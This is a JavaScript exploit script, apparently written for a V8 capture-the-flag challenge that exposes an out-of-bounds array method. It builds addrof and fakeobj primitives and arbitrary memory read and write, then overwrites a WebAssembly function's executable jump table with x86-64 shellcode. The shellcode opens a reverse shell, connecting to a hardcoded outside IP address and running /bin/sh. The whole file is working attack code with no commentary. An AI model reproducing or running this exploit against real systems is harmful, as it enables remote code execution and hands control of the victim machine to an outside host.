let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

function pause() {
 while(true) {};
}

function addrof(x) {
  function A(x,y){this.a=x;this.b=y;};
  function B(x,y){this.x=x;this.y=y;};

  var a = new A(x, 1.1);
  var b = new B(1.1,2.1);
  var a0 = Array(1,1,1,1);
  var o0 = new A(x,2.1);
  var a1 = Array(1,1,1,1);
  var o1 = new B(1.1,2.1);

  o0_map = a0.oob().f2i();
  o1_map = o0_map - 0xdb9n + 0xef9n;

  a0.oob(o1_map.i2f());

  return o0.x.f2i();
}

function fakeobj(addr) {
  function A(x,y){this.a=x;this.b=y;};
  function B(x,y){this.x=x;this.y=y;};

  var x = new ArrayBuffer(0x1000);

  var a = new A(x, 1.1);
  var b = new B(1.1,2.1);
  var a0 = Array(1,1,1,1);
  var o0 = new A(x,2.1);
  var a1 = Array(1,1,1,1);
  var o1 = new B(1.1,2.1);

  o0_map = a0.oob().f2i();
  o1_map = o0_map - 0x0d9n + 0x219n;

  a0.oob(o1_map.i2f());
  o0.x = addr.i2f();
  a0.oob(o0_map.i2f());

  return o0.a;
}

function giveme_rw() {
  var a0 = Array(1,1,1,1);
  var ab = new ArrayBuffer(0x1000);

  ab_map = a0.oob().f2i();
  console.log("o0 map : " + ab_map.hex());

  ab_ele = addrof(ab[0]) + 0x7a0n;
  console.log("ab ele : " + ab_ele.hex());

  var fake_ab_float = [ab_map.i2f(), ab_ele.i2f(), ab_ele.i2f(), BigInt(0x00004000).i2f(), BigInt(0xdeadbeaf).i2f(), BigInt(0x2).i2f()];
  var fake_ab_float_addr = addrof(fake_ab_float);
  console.log("fake_ab_float_addr : " + fake_ab_float_addr.hex());

  var fake_ab_addr = fake_ab_float_addr + 0xf0n;
  console.log("fake_ab_addr : " + fake_ab_addr.hex());

  fake_ab = fakeobj(fake_ab_addr);

  return {
    read(addr, len) {
      fake_ab_float[4] = addr.i2f();
      var arb = new Uint8Array(fake_ab);
      return arb.subarray(0, len);
    },
    readPtr(addr) {
      var bytes = this.read(addr, 8);
      var buffer = new ArrayBuffer(8);
      var byteView    = new Uint8Array(buffer);
      var float64View = new Float64Array(buffer);
      byteView.set(bytes);
      return float64View[0].f2i();
    },
    write(addr, data) {
      fake_ab_float[4] = addr.i2f();
      var arb = new Uint8Array(fake_ab);
      return arb.set(data);
    },
  };

}


memory = giveme_rw();

//wasm
var importObject = {
    imports: { imported_func: arg => console.log(arg) }
};
bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0,   0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f,     0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1,  0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa,    0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
wasm_code = new Uint8Array(bc);
wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
wfunc = wasm_mod.exports.exported_func;
instance = addrof(wasm_mod) - 1n;
console.log('instance: ' + instance.hex());

let jump_table_start = memory.readPtr(instance+0x88n);
console.log('jump_table_start: ' + jump_table_start.hex());

//write shellcode
var shellcode = [72, 49, 192, 72, 49, 255, 72, 49, 246, 72, 49, 210, 77, 49, 192, 106, 2, 95, 106, 1, 94, 106, 6, 90, 106, 41, 88, 15, 5, 73, 137, 192, 72, 49, 246, 77, 49, 210, 65, 82, 198, 4, 36, 2, 102, 199, 68, 36, 2, 82, 14, 199, 68, 36, 4, 202, 121, 178, 181, 72, 137, 230, 106, 16, 90, 65, 80, 95, 106, 42, 88, 15, 5, 72, 49, 246, 106, 3, 94, 72, 255, 206, 106, 33, 88, 15, 5, 117, 246, 72, 49, 255, 87, 87, 94, 90, 72, 191, 47, 47, 98, 105, 110, 47, 115, 104, 72, 193, 239, 8, 87, 84, 95, 106, 59, 88, 15, 5];

memory.write(jump_table_start, shellcode);

wfunc();

pause();
